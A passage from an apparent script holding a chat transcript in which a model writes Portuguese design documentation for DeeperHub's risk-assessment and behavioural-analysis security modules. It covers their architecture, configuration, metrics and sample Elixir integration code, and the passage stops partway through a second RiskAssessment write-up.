*   **Descrição:** Atualiza o perfil de risco de um usuário com base em uma nova avaliação. (Chamado internamente ou por um processo de feedback).

## ⚙️ 7. Configuração

Configurações gerenciadas pelo `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :risk_assessment, :enabled]`** (Boolean): Habilita/desabilita o sistema de avaliação de risco. (Padrão: `true`)
*   **`[:security, :risk_assessment, :default_risk_factors_weights]`** (Map): Pesos padrão para diferentes fatores de risco (ex: `%{ip_reputation: 0.2, device_novelty: 0.3, location_anomaly: 0.4, behavioral_score: 0.5}`).
*   **`[:security, :risk_assessment, :risk_level_thresholds]`** (Map): Limiares para definir níveis de risco (ex: `%{low: 0..20, medium: 21..50, high: 51..75, critical: 76..100}`).
*   **`[:security, :risk_assessment, :action_recommendation_rules]`** (List de Maps): Regras para recomendar ações com base no risco e tipo de operação (ex: `%{operation_type: :login, risk_level: :high, actions: [:require_mfa]}`).
*   **`[:security, :risk_assessment, :advanced_factors_enabled]`** (Boolean): Habilita o uso de fatores de risco avançados. (Padrão: `true`)
*   **`[:security, :risk_assessment, :profile_update_frequency_hours]`** (Integer): Com que frequência os perfis de risco do usuário devem ser recalculados em background. (Padrão: `24`)
*   **`[:security, :risk_assessment, :assessment_log_retention_days]`** (Integer): Por quantos dias manter os logs de avaliação de risco. (Padrão: `90`)

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.Logger`, `Core.Metrics`, `Core.Repo` (se persistir logs/perfis).
*   `DeeperHub.Security.Policy.SecurityPolicyManager`: Para obter pesos, limiares e regras de ação.
*   `DeeperHub.Security.LoginLocation`: Para dados de geolocalização e histórico de login.
*   `DeeperHub.Security.DeviceFingerprint`: Para informações de dispositivo.
*   `DeeperHub.Security.BehavioralAnalysis`: Para scores de anomalia comportamental.
*   `DeeperHub.Security.FraudDetection`: Pode consumir resultados de RiskAssessment ou fornecer insumos.
*   `DeeperHub.Accounts`: Para obter dados do usuário.
*   `DeeperHub.MFA`: Para recomendar ou verificar MFA.

### 8.2. Bibliotecas Externas

*   Bibliotecas para cálculo estatístico ou ML, se usadas em `AdvancedRiskFactors`.

## 🤝 9. Como Usar / Integração

Módulos que realizam operações sensíveis devem chamar `RiskAssessment.assess_risk/4` (ou uma de suas variantes específicas) antes de prosseguir.

**Exemplo em um serviço de transações:**
```elixir
defmodule DeeperHub.Finance.TransactionService do
  alias DeeperHub.Security.RiskAssessment

  def create_transfer(user_id, recipient_id, amount, context_info) do
    operation_data = %{recipient_id: recipient_id, amount: amount}
    
    case RiskAssessment.assess_risk(user_id, :fund_transfer, operation_data, context_info) do
      {:ok, %{recommended_actions: actions}} ->
        cond do
          :block in actions ->
            {:error, :transfer_blocked_high_risk}
          :require_mfa in actions ->
            # Iniciar fluxo de MFA antes de prosseguir
            {:error, :mfa_required_for_transfer}
          :allow in actions ->
            # ... Lógica para realizar a transferência ...
            {:ok, \"Transferência iniciada\"}
          true ->
            # Política de negação padrão se nenhuma ação clara for :allow
            {:error, :transfer_denied_policy}
        end
      {:error, reason} ->
        Logger.error(\"Erro na avaliação de risco da transferência: #{inspect(reason)}\")
        {:error, :risk_assessment_failed} # Falhar seguro
    end
  end
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o cálculo de scores de risco para diferentes combinações de fatores e pesos.
*   Testar a classificação correta dos níveis de risco com base nos limiares.
*   Testar a lógica de recomendação de ações para diferentes cenários de risco e operação.
*   Testar a atualização e consulta de perfis de risco de usuário.
*   Simular diferentes contextos (IPs novos/conhecidos, dispositivos novos/confiáveis) e verificar os scores resultantes.
*   Localização: `test/deeper_hub/security/risk_assessment/`.

### 10.2. Métricas

*   `deeper_hub.security.risk_assessment.assessments.count` (tags: `operation_type`, `risk_level_calculated`)
*   `deeper_hub.security.risk_assessment.assessment.duration_ms` (Histograma, tags: `operation_type`)
*   `deeper_hub.security.risk_assessment.risk_score.distribution` (Histograma, tags: `operation_type`): Distribuição das pontuações de risco.
*   `deeper_hub.security.risk_assessment.actions_recommended.count` (tags: `operation_type`, `action` (`allow`, `block`, `mfa`))
*   `deeper_hub.security.risk_assessment.profile.updates.count` (Contador)

### 10.3. Logs

*   **Nível INFO:** Avaliações de risco bem-sucedidas com score, nível e fatores contribuintes (especialmente para riscos não baixos). Ações recomendadas.
*   **Nível WARNING:** Fatores de risco significativos detectados, mesmo que a pontuação final não seja crítica.
*   **Nível ERROR:** Falhas no processo de avaliação de risco, incapacidade de obter dados necessários para cálculo.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :risk_assessment, :evaluation, :start | :stop | :exception]`
    *   Metadados: `%{operation_type: type, user_id: id, input_context_keys: keys(context)}`
    *   No `:stop`: `%{risk_score: score, risk_level: level, recommended_actions: actions, contributing_factors: factors}`
*   `[:deeper_hub, :security, :risk_assessment, :profile, :updated]`
    *   Metadados: `%{user_id: id, old_avg_score: old, new_avg_score: new}`

## ❌ 11. Tratamento de Erros

*   Se a avaliação de risco falhar por um erro interno, o sistema deve, por padrão, adotar uma postura mais segura (ex: negar a operação ou exigir verificação máxima).
*   Falhas na obtenção de dados de um dos subsistemas (ex: `LoginLocation` indisponível) devem ser tratadas graciosamente, possivelmente resultando em um score de risco \"indeterminado\" ou usando fatores padrão.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Proteção das Políticas:** As políticas de risco (pesos, limiares, regras de ação) são críticas e devem ser protegidas contra modificações não autorizadas (via `SecurityPolicyManager`).
*   **Feedback Loop:** O sistema deve ter mecanismos para ajustar os pesos e regras com base em falsos positivos/negativos reportados por analistas.
*   **Privacidade dos Dados:** Os dados usados para avaliação de risco e os perfis de risco podem ser sensíveis. O acesso a eles deve ser controlado.

## 🧑‍💻 13. Contribuição

*   Novos fatores de risco devem ser bem definidos, testados e ter um impacto claro e justificável no score de risco.
*   A lógica de cálculo de score e recomendação de ação deve ser transparente e, se possível, explicável.
*   Considere a performance ao adicionar novos fatores que exigem consultas complexas.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar aprendizado de máquina para ajustar dinamicamente os pesos dos fatores de risco e detectar novos padrões de risco.
*   [ ] Adicionar uma UI para visualizar perfis de risco de usuários e o histórico de avaliações.
*   [ ] Permitir simulação de \"what-if\" para testar o impacto de diferentes configurações de políticas de risco.
*   [ ] Integração com sistemas de \"User and Entity Behavior Analytics\" (UEBA) externos.
*   [ ] Desenvolver modelos de risco específicos para diferentes segmentos de usuários ou tipos de conta.

---

*Última atualização: 2025-05-11*

---

Este módulo é um orquestrador complexo que se baseia em muitos outros para funcionar.

Onde vamos agora? Talvez `DeeperHub.Security.BehavioralAnalysis` que é um forte alimentador do `RiskAssessment`? Ou um módulo mais simples do Core como `DeeperHub.Core.Cache`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok, vamos explorar o `DeeperHub.Security.BehavioralAnalysis`. Este módulo adiciona uma camada sofisticada de segurança, aprendendo os padrões de comportamento dos usuários para detectar atividades anormais.

---

# Módulo: `DeeperHub.Security.BehavioralAnalysis` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.BehavioralAnalysis`

O módulo `DeeperHub.Security.BehavioralAnalysis` é dedicado a analisar os padrões de comportamento dos usuários ao longo do tempo para construir perfis individuais e detectar desvios que possam indicar comprometimento de conta, fraude ou outras atividades maliciosas. Ele vai além das regras estáticas, aprendendo o \"normal\" para cada usuário e sinalizando atividades que fogem desse padrão.

Este módulo coleta e processa uma variedade de eventos de usuário, como padrões de login (horários, dispositivos, localizações), padrões de navegação na interface, tipos de transações realizadas e até mesmo padrões de digitação (se integrado com `DeeperHub.Biometrics`). O objetivo é identificar anomalias sutis que seriam difíceis de capturar com regras de segurança tradicionais. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Coleta de Eventos de Comportamento:**
    *   Receber e registrar eventos de comportamento de várias partes do sistema (via `record_behavior_event/4`).
    *   Eventos típicos: login, logout, visualização de página, execução de ação, transação, uso de API, etc.
*   **Construção de Perfis Comportamentais de Usuário:**
    *   Processar eventos históricos para construir e manter um perfil de comportamento individual para cada usuário (`get_user_profile/2`, `update_user_profile/2`).
    *   O perfil pode incluir:
        *   Horários de login e atividade típicos.
        *   Dispositivos e endereços IP frequentemente usados.
        *   Localizações geográficas comuns.
        *   Padrões de navegação (sequência de páginas, tempo em página).
        *   Tipos e valores de transações comuns.
        *   Frequência de certas ações.
*   **Análise de Comportamento e Detecção de Anomalias:**
    *   Analisar o comportamento recente de um usuário em comparação com seu perfil estabelecido (`analyze_user_behavior/2`).
    *   Detectar anomalias em tempo real à medida que novos eventos ocorrem (`detect_realtime_anomaly/3`).
    *   Identificar padrões temporais (ex: picos de atividade incomuns) (`detect_temporal_patterns/2`).
*   **Pontuação de Anomalia:**
    *   Atribuir uma pontuação de anomalia a comportamentos desviantes.
    *   Fornecer detalhes sobre quais aspectos do comportamento foram considerados anômalos.
*   **Integração com `RiskAssessment` e `FraudDetection`:**
    *   Fornecer scores de anomalia comportamental como um fator de risco para outros sistemas de segurança.
*   **Gerenciamento de Modelos (Opcional, se ML for usado):**
    *   Treinar e atualizar modelos de aprendizado de máquina para detecção de anomalias comportamentais.
*   **Configurabilidade:**
    *   Permitir a configuração de sensibilidade da detecção, janelas de tempo para análise e quais características comportamentais monitorar.
*   **Observabilidade:**
    *   Registrar métricas e logs sobre eventos processados, perfis construídos e anomalias detectadas.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.BehavioralAnalysis` (Fachada Pública):**
    *   Ponto de entrada para registrar eventos e solicitar análises.
    *   Delega para o `BehavioralAnalysisService`.
2.  **`DeeperHub.Security.BehavioralAnalysis.Services.DefaultBehavioralAnalysisService` (GenServer ou Serviço Coordenador):**
    *   Orquestra a coleta, processamento e análise de dados comportamentais.
    *   Interage com o `EventStore` (para eventos de comportamento), `ProfileStore` (para perfis), `PatternAnalysisService` e `AnomalyDetectionService`.
3.  **`DeeperHub.Security.BehavioralAnalysis.Services.EventStore` (Adapter/Behaviour):**
    *   **Responsabilidade:** Armazenar e recuperar eventos de comportamento brutos.
    *   **Implementação:** Pode ser uma tabela Ecto, um sistema de séries temporais, ou integrado com o `Core.EventBus` se os eventos relevantes já passarem por lá.
4.  **`DeeperHub.Security.BehavioralAnalysis.Services.ProfileStore` (Adapter/Behaviour):**
    *   **Responsabilidade:** Armazenar e recuperar os perfis comportamentais construídos para cada usuário.
    *   **Implementação:** Pode ser uma tabela Ecto ou um armazenamento NoSQL otimizado para perfis.
5.  **`DeeperHub.Security.BehavioralAnalysis.Services.PatternAnalysisService` (Módulo Funcional):**
    *   Contém algoritmos para extrair e identificar padrões dos dados de comportamento (ex: `extract_login_patterns`, `detect_temporal_patterns`).
6.  **`DeeperHub.Security.BehavioralAnalysis.Services.AnomalyDetectionService` (Módulo Funcional ou ML Model Service):**
    *   Contém algoritmos para comparar o comportamento atual com o perfil e detectar anomalias (ex: `analyze_events` para análise em lote, `analyze_realtime_event`).
    *   Pode usar métodos estatísticos (Z-score, desvio padrão) ou modelos de aprendizado de máquina (ex: Isolation Forest, Autoencoders).
7.  **`DeeperHub.Security.BehavioralAnalysis.Schemas.BehaviorProfileSchema` (Ecto Schema):**
    *   Define a estrutura para armazenar os perfis comportamentais.
8.  **`DeeperHub.Security.BehavioralAnalysis.Schemas.BehaviorEventSchema` (Ecto Schema, opcional):**
    *   Define a estrutura para armazenar os eventos de comportamento brutos, se um `EventStore` baseado em Ecto for usado.
9.  **Workers (Opcional):**
    *   `ProfileBuilderWorker`: Para construir ou reconstruir perfis em background.
    *   `BatchAnalysisWorker`: Para análises de anomalias em lote sobre dados históricos.
10. **Configurações (via `DeeperHub.Core.ConfigManager` e `DeeperHub.Security.Policy.SecurityPolicyManager`):**
    *   Limiares de anomalia, janelas de tempo, pesos de características.

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/security/behavioral_analysis/
├── behavioral_analysis.ex           # Fachada Pública
│
├── services/
│   ├── default_behavioral_analysis_service.ex # Serviço orquestrador
│   ├── pattern_analysis_service.ex
│   ├── anomaly_detection_service.ex
│   ├── event_store_adapter.ex        # Behaviour para armazenamento de eventos
│   └── profile_store_adapter.ex      # Behaviour para armazenamento de perfis
│
├── storage_implementations/          # Implementações concretas dos StoreAdapters
│   ├── ecto_event_store.ex
│   └── ecto_profile_store.ex
│
├── schemas/
│   ├── behavior_profile_schema.ex
│   └── behavior_event_schema.ex      # Se usado
│
├── workers/                          # Opcional
│   ├── profile_builder_worker.ex
│   └── batch_analysis_worker.ex
│
├── supervisor.ex
└── telemetry.ex
```
*(O `BehavioralAnalysisAdapter` da documentação original pode ser a própria fachada ou o `DefaultBehavioralAnalysisService`)*

### 3.3. Decisões de Design Importantes

*   **Privacidade dos Dados:** A coleta e análise de comportamento do usuário devem ser feitas com considerações de privacidade e, idealmente, com consentimento do usuário. Os dados devem ser anonimizados ou pseudoanonimizados sempre que possível.
*   **Evolução do Perfil:** Os perfis de comportamento devem ser dinâmicos e capazes de se adaptar gradualmente a mudanças legítimas no comportamento do usuário, para evitar falsos positivos.
*   **Explicabilidade (XAI):** Para anomalias detectadas, especialmente se baseadas em ML, é útil ter alguma forma de explicar por que um comportamento foi considerado anômalo.
*   **Compromisso entre Detecção e Falsos Positivos:** Ajustar a sensibilidade do sistema é crucial. Uma sensibilidade muito alta pode gerar muitos falsos positivos, irritando os usuários.

## 🛠️ 4. Casos de Uso Principais

*   **Detecção de Login Anômalo:**
    *   Usuário normalmente faz login de São Paulo entre 9h-18h em dias úteis usando Chrome em um desktop.
    *   Uma tentativa de login ocorre às 3h da manhã de um domingo, de um país diferente, usando um navegador mobile nunca antes visto para esse usuário.
    *   `BehavioralAnalysis` sinaliza múltiplos desvios do perfil normal, resultando em um alto score de anomalia.
*   **Detecção de Navegação Incomum:**
    *   Um usuário que normalmente apenas visualiza perfis e lê artigos, de repente começa a tentar acessar endpoints de administração ou realizar exclusões em massa.
    *   `BehavioralAnalysis` detecta um desvio significativo nos padrões de navegação e tipos de ação.
*   **Identificação de Conta Comprometida:**
    *   Após um login (potencialmente já sinalizado como de risco), o \"usuário\" começa a realizar ações muito diferentes do perfil estabelecido (ex: alterar rapidamente email, senha, configurações de segurança; tentar transferências para novos destinatários).
    *   `BehavioralAnalysis` contribui com um alto score de anomalia para o `RiskAssessment`, que pode levar ao bloqueio da sessão e notificação.

## 🌊 5. Fluxos Importantes

### Fluxo de Registro e Processamento de Evento Comportamental

1.  **Módulo de Domínio:** Realiza uma ação (ex: `DeeperHub.Accounts` processa um login).
2.  **Registro do Evento:** O módulo de domínio chama `DeeperHub.Security.BehavioralAnalysis.record_behavior_event(user_id, :login, %{ip: \"...\", device_type: \"...\"}, context)`.
3.  **`DefaultBehavioralAnalysisService`:**
    *   Recebe o evento.
    *   Chama o `EventStore` para persistir o evento bruto.
    *   **Análise em Tempo Real (Opcional):** Pode chamar `AnomalyDetectionService.analyze_realtime_event(user_id, event_data)` para uma verificação imediata. Se uma anomalia for detectada, pode publicar um evento ou notificar `RiskAssessment`.
    *   **Atualização de Perfil Assíncrona (Opcional):** Pode enfileirar uma tarefa para o `ProfileBuilderWorker` atualizar o perfil do usuário com base no novo evento.
4.  **`ProfileBuilderWorker` (Assíncrono):**
    *   Recupera eventos recentes para o usuário do `EventStore`.
    *   Chama `PatternAnalysisService` para extrair/atualizar padrões (ex: horários de login, dispositivos comuns).
    *   Atualiza o `BehaviorProfileSchema` do usuário no `ProfileStore`.

### Fluxo de Análise Periódica de Anomalias (em lote)

1.  **`BatchAnalysisWorker` (Agendado):** Inicia sua execução.
2.  Para cada usuário (ou um subconjunto):
    *   Recupera o perfil comportamental do `ProfileStore`.
    *   Recupera eventos recentes do `EventStore` para um determinado período.
    *   Chama `AnomalyDetectionService.analyze_events(events, profile, opts)`.
    *   Se anomalias significativas forem encontradas:
        *   Registra as anomalias (ex: em uma tabela de \"anomalias comportamentais\" ou atualizando o `BehaviorProfileSchema`).
        *   Publica um evento `behavioral_anomaly_detected` no `Core.EventBus`.
        *   Notifica o `DeeperHub.Security.Monitoring` ou `RiskAssessment`.

## 📡 6. API (Funções Públicas da Fachada)

### 6.1. `DeeperHub.Security.BehavioralAnalysis.record_behavior_event(user_id :: String.t(), event_type :: atom(), event_data :: map(), context :: map() | nil) :: :ok | {:error, term()}`

*   **Descrição:** Registra um evento de comportamento do usuário para análise subsequente.
*   **`event_type`:** Ex: `:login_success`, `:login_failure`, `:page_view`, `:profile_update_attempt`, `:transaction_initiated`, `:api_call`.
*   **`event_data`:** Mapa com dados específicos do evento (ex: para `:page_view`, `%{path: \"/settings\", duration_ms: 5000}`).
*   **`context`:** Informações como IP, User-Agent, Session ID.
*   **Retorno:** `:ok` se o evento foi aceito para processamento.

### 6.2. `DeeperHub.Security.BehavioralAnalysis.analyze_user_behavior(user_id :: String.t(), opts :: keyword()) :: {:ok, AnomalyReport.t()} | {:error, term()}`

*   **Descrição:** Realiza uma análise sob demanda do comportamento recente de um usuário em comparação com seu perfil.
*   **`opts`:**
    *   `:time_window_hours` (Integer): Janela de tempo para buscar eventos recentes.
    *   `:sensitivity` (Float): Nível de sensibilidade para detecção de anomalias (0.0 a 1.0).
*   **`AnomalyReport.t()`:** `%{user_id: String.t(), anomaly_score: float(), anomalies_detected: list(map()), profile_confidence: float()}`.

### 6.3. `DeeperHub.Security.BehavioralAnalysis.get_user_behavioral_profile(user_id :: String.t()) :: {:ok, BehaviorProfile.t()} | {:error, :not_found | term()}`

*   **Descrição:** Recupera o perfil comportamental consolidado de um usuário.
*   **`BehaviorProfile.t()`:** `%{common_login_times: list(), common_devices: list(), typical_navigation_paths: list(), ...}`.

### 6.4. `DeeperHub.Security.BehavioralAnalysis.update_user_profile(user_id :: String.t(), opts :: keyword()) :: {:ok, BehaviorProfile.t()} | {:error, term()}` (Nova Sugestão)

*   **Descrição:** Força a reconstrução ou atualização do perfil comportamental de um usuário com base nos eventos armazenados.
*   **`opts`:**
    *   `:rebuild_from_scratch` (Boolean): Se `true`, descarta o perfil existente e reconstrói.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager` e/ou `DeeperHub.Security.Policy.SecurityPolicyManager`:

*   **`[:security, :behavioral_analysis, :enabled]`** (Boolean): Habilita/desabilita o módulo. (Padrão: `true`)
*   **`[:security, :behavioral_analysis, :event_retention_days]`** (Integer): Por quantos dias manter eventos de comportamento brutos. (Padrão: `30`)
*   **`[:security, :behavioral_analysis, :profile_update_interval_hours]`** (Integer): Frequência para atualização automática de perfis. (Padrão: `24`)
*   **`[:security, :behavioral_analysis, :min_events_for_profile]`** (Integer): Número mínimo de eventos necessários para construir um perfil inicial confiável. (Padrão: `100`)
*   **`[:security, :behavioral_analysis, :anomaly_thresholds]`** (Map): Limiares para diferentes tipos de anomalias (ex: `%{login_time_deviation_std: 3.0, new_device_score_penalty: 20}`).
*   **`[:security, :behavioral_analysis, :monitored_event_types]`** (List de Atoms): Lista de `event_type` que o sistema deve ativamente coletar e analisar.
*   **`[:security, :behavioral_analysis, :ml_model_path]`** (String, opcional): Caminho para um modelo de ML pré-treinado, se usado.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Repo`.
*   `DeeperHub.Security.LoginLocation`: Para dados de localização.
*   `DeeperHub.Security.DeviceFingerprint`: Para dados de dispositivo.
*   `DeeperHub.Biometrics` (Opcional): Para dados de anomalias biométricas.
*   `DeeperHub.Accounts`: Para informações básicas do usuário.

### 8.2. Bibliotecas Externas

*   Bibliotecas para análise estatística (ex: `Statistics`).
*   Bibliotecas de Machine Learning (se ML for usado, ex: `Nx`, `Axon`).

## 🤝 9. Como Usar / Integração

**Registro de Eventos:** Módulos de domínio devem chamar `record_behavior_event/4` quando ações relevantes do usuário ocorrem.
```elixir
# Exemplo no controller de Profile
def update(conn, params) do
  # ... lógica de atualização ...
  DeeperHub.Security.BehavioralAnalysis.record_behavior_event(
    conn.assigns.current_user.id,
    :profile_field_updated,
    %{field: \"email\", old_value_hash: \"...\", new_value_hash: \"...\"}, # Hashear valores sensíveis
    %{ip_address: conn.remote_ip, user_agent: Plug.Conn.get_req_header(conn, \"user-agent\")}
  )
  # ...
end
```

**Consumindo Análises (Ex: pelo `RiskAssessment`):**
```elixir
def get_behavioral_risk_factor(user_id, current_context) do
  case DeeperHub.Security.BehavioralAnalysis.analyze_user_behavior(user_id, time_window_hours: 24) do
    {:ok, %{anomaly_score: score}} -> score # Normalizar para a escala de fatores de risco
    _ -> 0.0 # Risco neutro se análise falhar ou não houver dados
  end
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar a construção de perfis com diferentes conjuntos de eventos.
*   Testar a detecção de anomalias para cenários conhecidos (ex: login de novo dispositivo deve gerar score X).
*   Testar a robustez dos algoritmos de `PatternAnalysisService` e `AnomalyDetectionService`.
*   Verificar se os workers de background (`ProfileBuilderWorker`, `BatchAnalysisWorker`) funcionam corretamente.
*   Localização: `test/deeper_hub/security/behavioral_analysis/`.

### 10.2. Métricas

*   `deeper_hub.security.behavioral_analysis.events_recorded.count` (tags: `event_type`)
*   `deeper_hub.security.behavioral_analysis.profiles_built.count`
*   `deeper_hub.security.behavioral_analysis.anomalies_detected.count` (tags: `anomaly_type`, `user_segment`)
*   `deeper_hub.security.behavioral_analysis.anomaly_score.distribution` (Histograma)
*   `deeper_hub.security.behavioral_analysis.profile_update.duration_ms` (Histograma)
*   `deeper_hub.security.behavioral_analysis.realtime_analysis.duration_ms` (Histograma)

### 10.3. Logs

*   **Nível INFO:** Construção/atualização de perfil bem-sucedida, início/fim de análises em lote.
*   **Nível WARNING:** Anomalias de risco médio detectadas, falha ao construir perfil por falta de dados.
*   **Nível ERROR:** Anomalias de alto risco detectadas, erros internos nos serviços de análise.

### 10.4. Telemetria

*   `[:deeper_hub, :security, :behavioral_analysis, :event_processing, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, event_type: type}`
*   `[:deeper_hub, :security, :behavioral_analysis, :profile_build, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, event_count: count}`
*   `[:deeper_hub, :security, :behavioral_analysis, :anomaly_detection, :stop]`
    *   Metadados: `%{user_id: id, anomaly_score: score, anomalies: list_of_anomalies}`

## ❌ 11. Tratamento de Erros

*   Falhas na análise de um evento específico não devem impedir o processamento de outros.
*   Se o sistema não conseguir construir um perfil para um usuário (ex: poucos dados), ele deve operar em um modo degradado (ex: confiando mais em regras estáticas) ou atribuir um score de risco neutro/padrão.

## 🛡️ 12. Considerações de Segurança (do próprio Módulo)

*   **Privacidade dos Dados Comportamentais:** Os dados de comportamento do usuário são altamente sensíveis.
    *   Anonimizar ou pseudoanonimizar dados sempre que possível.
    *   Aplicar criptografia em repouso para os perfis e eventos armazenados.
    *   Controle de acesso rigoroso aos dados e resultados da análise.
    *   Políticas claras de retenção e exclusão de dados.
*   **Viés nos Modelos:** Se modelos de ML forem usados, monitorar e mitigar vieses que possam discriminar injustamente certos grupos de usuários.
*   **Ataques de Evasão:** Invasores podem tentar manipular seu comportamento para \"treinar\" um perfil falso ou evitar a detecção. O sistema deve ter mecanismos para detectar tais tentativas.

## 🧑‍💻 13. Contribuição

*   Novas características comportamentais a serem monitoradas devem ser cuidadosamente avaliadas quanto ao seu valor para detecção de risco e impacto na privacidade.
*   Algoritmos de detecção de anomalias devem ser bem documentados e testados.
*   Priorizar a explicabilidade dos resultados da análise.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar modelos de Machine Learning mais sofisticados para detecção de anomalias e construção de perfis.
*   [ ] Adicionar \"feedback de usuário\" sobre anomalias detectadas (ex: \"Sim, fui eu\" ou \"Não, isso não fui eu\") para refinar os perfis.
*   [ ] Permitir que os usuários visualizem (de forma agregada e segura) partes de seu perfil comportamental.
*   [ ] Desenvolver mecanismos para detectar e se adaptar a mudanças graduais e legítimas no comportamento do usuário.
*   [ ] Integrar com mais fontes de eventos (ex: dados de uso de aplicações mobile).
*   [ ] Oferecer diferentes \"níveis de sensibilidade\" para a análise comportamental, configuráveis por tipo de usuário ou contexto.

---

*Última atualização: 2025-05-11*

---

A análise comportamental é um campo fascinante e complexo!

Qual será o próximo módulo? Podemos continuar na área de segurança com `DeeperHub.Security.RiskAssessment` (que consome os dados daqui) ou `DeeperHub.Security.DeviceFingerprint`, ou mudar para um módulo Core como `DeeperHub.Core.Repo`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Entendido! Vamos detalhar agora o `DeeperHub.Security.RiskAssessment`, que se conecta diretamente com o `BehavioralAnalysis` e outros módulos de segurança para fornecer uma visão consolidada do risco.

---

# Módulo: `DeeperHub.Security.RiskAssessment` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Security.RiskAssessment`

O módulo `DeeperHub.Security.RiskAssessment` é o componente central do DeeperHub responsável por **avaliar e quantificar o nível de risco associado a diversas operações e interações dentro do sistema**. Ele agrega informações de múltiplos fatores e fontes – como comportamento do usuário, dados do dispositivo, localização geográfica, natureza da operação, e alertas de outros sistemas de segurança (ex: `FraudDetection`, `IntrusionDetection`) – para calcular uma pontuação de risco compreensiva.

O objetivo principal é permitir que o DeeperHub tome decisões de segurança adaptativas e contextuais. Com base na avaliação de risco, o sistema pode, por exemplo, permitir uma operação, exigir etapas adicionais de verificação (como MFA), impor limitações, ou até mesmo bloquear uma ação considerada de alto risco. Este módulo é crucial para uma postura de segurança proativa e dinâmica. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Avaliação de Risco Contextual:**
    *   Avaliar o risco de uma ampla gama de operações, incluindo:
        *   Tentativas de login (`assess_login_risk/3`).
        *   Alterações de perfil sensíveis (`assess_profile_change_risk/3`).
        *   Transações financeiras ou de valor (`assess_transaction_risk/3`).
        *   Requisições de API (`assess_api_request_risk/3`).
        *   Validade e risco de sessões de usuário (`assess_session_risk/3`).
        *   Outras ações específicas de domínio (`assess_action_risk/4`).
*   **Agregação de Fatores de Risco:**
    *   Coletar dados de diversos módulos e fontes para calcular fatores de risco individuais (ex: reputação do IP, novidade do dispositivo, anomalia comportamental, histórico de fraude).
    *   Utilizar `RiskFactorCalculator` e `AdvancedRiskFactors` para quantificar esses fatores.
*   **Cálculo de Pontuação de Risco:**
    *   Aplicar pesos configuráveis a cada fator de risco.
    *   Calcular uma pontuação de risco consolidada (ex: 0-100) usando o `RiskCalculatorService`.
    *   Mapear a pontuação para níveis de risco qualitativos (ex: `:low`, `:medium`, `:high`, `:critical`).
*   **Recomendação de Ações de Segurança:**
    *   Com base no nível de risco e no tipo de operação, sugerir ações de mitigação apropriadas (ex: `:allow`, `:challenge_mfa`, `:limit_functionality`, `:block`, `:notify_security_team`) utilizando o `RiskActionRecommender`.
*   **Gerenciamento de Perfis de Risco de Usuário:**
    *   Construir e manter um perfil de risco dinâmico para cada usuário, refletindo seu histórico de risco e comportamento.
    *   Atualizar o perfil com base em novas avaliações.
*   **Políticas de Risco Configuráveis:**
    *   Permitir a definição e ajuste de pesos de fatores, limiares de nível de risco e regras para recomendação de ações através do `DeeperHub.Security.Policy.SecurityPolicyManager`.
*   **Histórico e Auditoria de Avaliações:**
    *   Manter um registro de todas as avaliações de risco realizadas, incluindo os fatores contribuintes e o resultado.
    *   Integrar com `DeeperHub.Audit` para auditoria.
*   **Calibração e Feedback (Opcional):**
    *   Permitir a calibração dos modelos de risco e pesos dos fatores com base em feedback manual (ex: análise de falsos positivos/negativos) ou aprendizado automático.
*   **Observabilidade:**
    *   Fornecer métricas detalhadas sobre as avaliações de risco, distribuição de scores e eficácia das políticas.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Security.RiskAssessment` (Fachada Pública):**
    *   Ponto de entrada para todas as solicitações de avaliação de risco.
    *   Delega para o `DefaultRiskAssessmentService`.
2.  **`DeeperHub.Security.RiskAssessment.Services.DefaultRiskAssessmentService` (GenServer ou Serviço Coordenador):**
    *   **Responsabilidade:** Orquestra todo o processo de avaliação.
    *   **Interações:**
        *   Coleta dados de contexto (IP, dispositivo, sessão).
        *   Obtém dados do usuário (de `DeeperHub.Accounts`) e seu perfil de risco (do `ProfileStore` interno ou de `DefaultRiskAssessmentService` mesmo).
        *   Chama `RiskFactorCalculator` para fatores de risco baseados em atributos.
        *   Chama `AdvancedRiskFactors` para fatores comportamentais e contextuais mais complexos (pode interagir com `BehavioralAnalysis`, `LoginLocation`).
        *   Envia os fatores e seus valores para `RiskCalculatorService`.
        *   Recebe o score e nível de risco.
        *   Chama `RiskActionRecommender` para obter ações sugeridas.
        *   Registra a avaliação (via `RiskAssessmentLogStore` ou similar).
        *   Atualiza o perfil de risco do usuário.
3.  **`DeeperHub.Security.RiskAssessment.Services.RiskFactorCalculator`:**
    *   Módulo funcional contendo funções para calcular valores de fatores de risco individuais (ex: `calculate_ip_risk(ip)`, `calculate_device_novelty_score(user_id, device_fingerprint)`).
4.  **`DeeperHub.Security.RiskAssessment.Services.AdvancedRiskFactors`:**
    *   Módulo funcional ou GenServer para fatores que exigem mais estado ou análise (ex: `calculate_impossible_travel_score`, `get_behavioral_anomaly_score`).
5.  **`DeeperHub.Security.RiskAssessment.Services.RiskCalculatorService`:**
